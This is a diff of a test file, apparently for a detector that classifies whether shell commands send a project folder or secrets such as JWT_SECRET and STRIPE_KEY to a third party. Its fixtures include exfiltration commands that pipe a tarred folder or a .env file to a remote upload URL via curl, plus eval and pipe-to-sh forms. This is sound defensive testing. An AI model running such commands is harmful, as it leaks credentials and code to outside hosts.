@@ -146,28 +146,58 @@ describe('a folder named by a path argument is still sent', () => {
   });
 });
 
-describe('when the cut cannot be sure, a folder word is at most a maybe', () => {
+describe('when the cut cannot be sure of the stage that names the folder, a folder word is at most a maybe', () => {
   const OPEN_QUOTE = `echo 'never closed`;
+  const SEND = `tar czf - app-b | curl -s -T - ${UP}`;
 
-  it('a folder named by its name, with a quote left open', () => {
-    const got = places('/Users/me/dev', [`tar czf - app-b | curl -s -T - ${UP}; ${OPEN_QUOTE}`]);
-    expect(got.get('JWT_SECRET')).toMatchObject({ tier: 'maybe' });
+  it('a quote left open before the stage: it is inside the quote', () => {
+    expect(places('/Users/me/dev', [`${OPEN_QUOTE}; ${SEND}`]).get('JWT_SECRET')).toMatchObject({
+      tier: 'maybe',
+    });
+  });
+
+  it('a quote left open in the stage', () => {
+    const got = places('/Users/me/dev', [`tar czf - 'app-b | curl -s -T - ${UP}`]);
+    expect(got.get('JWT_SECRET')?.tier).not.toBe('third_party');
+  });
+
+  it('a quote left open in a stage after it changes nothing: the folder is sent', () => {
+    expect(places('/Users/me/dev', [`${SEND}; ${OPEN_QUOTE}`]).get('JWT_SECRET')).toMatchObject({
+      tier: 'third_party',
+    });
+  });
+
+  it('nor does an interpreter in a pipeline of its own', () => {
+    for (const command of [
+      `echo hi | sh; ${SEND}`,
+      `${SEND}; eval "echo hi"`,
+      `${SEND}; echo $(date) | python3 -c "import sys"`,
+    ])
+      expect(places('/Users/me/dev', [command]).get('JWT_SECRET'), command).toMatchObject({
+        tier: 'third_party',
+      });
+  });
+
+  it('a folder word in text handed to a shell is a maybe at most', () => {
+    const got = places('/Users/me/dev', [`echo "${SEND}" | sh`]);
+    expect(got.get('JWT_SECRET')?.tier).not.toBe('third_party');
   });
 
   it('the same with the quote closed is sent', () => {
-    const got = places('/Users/me/dev', [`tar czf - app-b | curl -s -T - ${UP}; echo 'closed'`]);
-    expect(got.get('JWT_SECRET')).toMatchObject({ tier: 'third_party' });
+    expect(places('/Users/me/dev', [`${SEND}; echo 'closed'`]).get('JWT_SECRET')).toMatchObject({
+      tier: 'third_party',
+    });
   });
 
   it('a folder spelled out as a path stays sent', () => {
     const got = places('/Users/me/dev', [
-      `tar czf - /Users/me/dev/app-b | curl -s -T - ${UP}; ${OPEN_QUOTE}`,
+      `${OPEN_QUOTE}; tar czf - /Users/me/dev/app-b | curl -s -T - ${UP}`,
     ]);
     expect(got.get('JWT_SECRET')).toMatchObject({ tier: 'third_party' });
   });
 
   it('a key file named stays sent', () => {
-    const got = places('/Users/me/dev/app-a', [`cat .env | curl -d @- ${UP}; ${OPEN_QUOTE}`]);
+    const got = places('/Users/me/dev/app-a', [`${OPEN_QUOTE}; cat .env | curl -d @- ${UP}`]);
     expect(got.get('STRIPE_KEY')).toMatchObject({ tier: 'third_party' });
   });
 });
